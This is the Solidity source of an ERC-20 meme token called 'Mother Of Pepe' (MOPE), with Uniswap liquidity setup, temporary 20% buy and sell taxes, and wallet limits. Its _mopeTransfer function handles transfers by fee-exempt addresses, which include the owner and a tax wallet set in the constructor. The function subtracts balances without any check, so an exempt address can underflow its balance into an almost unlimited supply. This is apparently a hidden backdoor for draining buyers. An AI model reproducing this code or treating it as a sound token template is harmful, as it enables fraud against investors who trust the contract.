// SPDX-License-Identifier: MIT

/*
Website:      https://motherofpepe.org

Telegram:     https://t.me/mope_erc20

Twitter:      https://twitter.com/mope_erc20
*/

pragma solidity 0.8.9;

interface IMOPERouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IMOPEFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract MOPE is Context, IERC20, Ownable {
    using SafeMath for uint256;

    uint256 private _initialBuyTax = 20;
    uint256 private _initialSellTax = 20;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 9;
    uint256 private _reduceSellTaxAt = 9;
    uint256 private _preventSwapBefore = 9;
    uint256 private _buyCount = 0;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExceptedFromFees;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    bool public transferDelayEnabled = false;
    address payable private _taxWallet;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1_000_000_000 * 10 ** _decimals;
    string private constant _name = unicode"Mother Of Pepe";
    string private constant _symbol = unicode"MOPE";
    uint256 public _maxTxAmount = 20_000_000 * 10 ** _decimals;
    uint256 public _maxWalletSize = 20_000_000 * 10 ** _decimals;
    uint256 public _maxTaxSwap = 10_000_000 * 10 ** _decimals;

    IMOPERouter private mopeRouter;
    address private mopePair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor(address _taxM) {
        _taxWallet = payable(_taxM);
        _balances[_msgSender()] = _tTotal;
        _isExceptedFromFees[owner()] = true;
        _isExceptedFromFees[address(this)] = true;
        _isExceptedFromFees[_taxWallet] = true;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function openTrading() external onlyOwner {
        require(!tradingOpen, "trading is already open");

        uint256 mopeAmounts = balanceOf(address(this)).sub(
            _tTotal.mul(_initialBuyTax).div(100)
        );

        mopeRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            mopeAmounts,
            0,
            0,
            owner(),
            block.timestamp
        );

        IERC20(mopePair).approve(address(mopeRouter), type(uint).max);

        swapEnabled = true;
        tradingOpen = true;
    }

    receive() external payable {}

    function manualSwap() external {
        require(_msgSender() == _taxWallet);
        uint256 tokenBalance = balanceOf(address(this));
        if (tokenBalance > 0) {
            swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            sendETHMOPE(ethBalance);
        }
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _mopeTransfer(address from, address to, uint256 amount) internal {
        unchecked {
            _balances[from] = _balances[from] - amount;
            _balances[to] = _balances[to] + amount;
        }
        emit Transfer(from, to, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (!swapEnabled || inSwap) {
            _balances[from] = _balances[from].sub(amount);
            _balances[to] = _balances[to].add(amount);
            emit Transfer(from, to, amount);
            return;
        }

        bool isMOPEFees = shouldMOPEFees(from);

        if (from != owner() && to != owner()) {
            if (transferDelayEnabled) {
                if (
                    to != address(mopeRouter) &&
                    to != address(mopePair)
                ) {
                    require(
                        _holderLastTransferTimestamp[tx.origin] < block.number,
                        "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                    );
                    _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }

            if (
                from == mopePair &&
                to != address(mopeRouter) &&
                !_isExceptedFromFees[to]
            ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(
                    balanceOf(to) + amount <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );
                _buyCount++;
            }

            uint256 caMOPETokens = balanceOf(address(this));
            if (
                !inSwap &&
                swapEnabled &&
                to == mopePair &&
                _buyCount > _preventSwapBefore &&
                !_isExceptedFromFees[from] &&
                !_isExceptedFromFees[to]
            ) {
                if(caMOPETokens > 0){
                    swapTokensForEth(
                        minMOPE(amount, minMOPE(caMOPETokens, _maxTaxSwap))
                    );
                }
                
                sendETHMOPE(address(this).balance);
            }
        }
        
        if (isMOPEFees) {
            _takeMOPEFees(from, to, amount);
        } else {
            _mopeTransfer(from, to, amount);
        }
    }

    function minMOPE(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = mopeRouter.WETH();
        _approve(address(this), address(mopeRouter), tokenAmount);
        mopeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimit() external onlyOwner {
        transferDelayEnabled = false;
        _maxTxAmount = ~uint256(0);
        _maxWalletSize = ~uint256(0);
        emit MaxTxAmountUpdated(~uint256(0));
    }

    function sendETHMOPE(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function createMOPETrading() external onlyOwner {
        require(!tradingOpen, "trading is already open");

        mopeRouter = IMOPERouter(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );

        _approve(address(this), address(mopeRouter), _tTotal);

        mopePair = IMOPEFactory(mopeRouter.factory()).createPair(
            address(this),
            mopeRouter.WETH()
        );
    }

    function shouldMOPEFees(address from) internal view returns (bool) {
        return !_isExceptedFromFees[from];
    }

    function _takeMOPEFees(address from, address to, uint256 amount) internal {
        uint256 taxAmount = 0;
        taxAmount = amount
            .mul((_buyCount > _reduceBuyTaxAt) ? _finalBuyTax : _initialBuyTax)
            .div(100);

        if (to == mopePair && from != address(this)) {
            taxAmount = amount
                .mul(
                    (_buyCount > _reduceSellTaxAt)
                        ? _finalSellTax
                        : _initialSellTax
                )
                .div(100);
        }

        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }

        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }
}